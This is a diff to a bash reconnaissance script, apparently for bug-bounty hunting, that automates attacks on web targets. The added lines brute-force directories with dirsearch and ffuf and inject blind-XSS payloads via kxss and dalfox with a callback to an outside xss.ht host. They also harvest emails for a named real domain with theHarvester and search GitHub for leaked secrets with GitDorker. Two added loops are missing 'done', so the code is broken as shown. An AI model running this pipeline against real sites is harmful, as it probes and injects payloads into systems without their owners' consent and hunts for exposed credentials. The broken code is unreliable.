@@ -1,10 +1,19 @@
 ##!/bin/bash
 
+
+##usage - ./after_recon.sh all.txt  (where all.txt is obtained from recon.sh)
+
 if [ ! -d "wayback-data" ]; then
 	mkdir wayback-data
 fi
 
-mkdir wayback-data
+if [ ! -d "dirsearch" ]; then
+	mkdir dirsearch
+fi
+for script in $(cat httprobe.txt);do python3 /opt/tools/dir-fuzz/dirsearch/dirsearch.py -e * -u $script -i 200,402,403,302,500 | tee -a dirsearch/$script.txt
+
+
+
 echo -e "\e[91m-------------------gau Scan Started--------------------------------------------------\e[0m"
 cat httprobe.txt | gau | tee -a wayback-data/gau.txt
 
@@ -25,6 +34,7 @@ cat wayback-data/waybackurls.txt | grep -P "\w+\.js(\?|$)" | sort -u | tee -a wa
 cat wayback-data/waybackurls.txt | grep -P "\w+\.php(\?|$)" | sort -u | tee -a  wayback-data/phpurls.txt
 cat wayback-data/waybackurls.txt | grep -P "\w+\.aspx(\?|$)" | sort -u | tee -a  wayback-data/aspxurls.txt
 cat wayback-data/waybackurls.txt | grep -P "\w+\.jsp(\?|$)" | sort -u | tee -a  wayback-data/jspurls.txt
+cat wayback-data/waybackurls.txt | kxss | sed 's/=.*/=/'| sed 's/URL: //'| dalfox pipe -b https://teja2510.xss.ht
 
 
 scanSuspect(){
@@ -68,6 +78,12 @@ cd ..
 echo -e "\e[91m-------------------creating custom wordlists------------------------------------------\e[0m"
 for script in $(cat js/jsurls.txt);do python3 ~/teja/scripts/getjswords.py $script | sort -u |tee -a jswordlist.txt ;done
 
+mkdir fuzzresults
+for script in $(cat httprobe.txt);do ffuf -c -w jswordlist.txt -u $script/FUZZ -mc 200,402,403,302,500 -maxtime 300 -timeout 2 | tee -a fuzzresults/$script.txt | tnotify "fuzzing is done"
+
+python3 ~/tools/theHarvester/theHarvester.py -d mypaytm.com -l 500 -b google
+
+python3 ~/tools/GitDorker/GitDorker.py -tf ~/tools/GitDorker/TOKENSFILE -q $1 -d ~/tools/GitDorker/dorks/alldorks.txt -o gitdorks.txt
 
 nuclei_auto(){
         echo "Starting Nuclei"
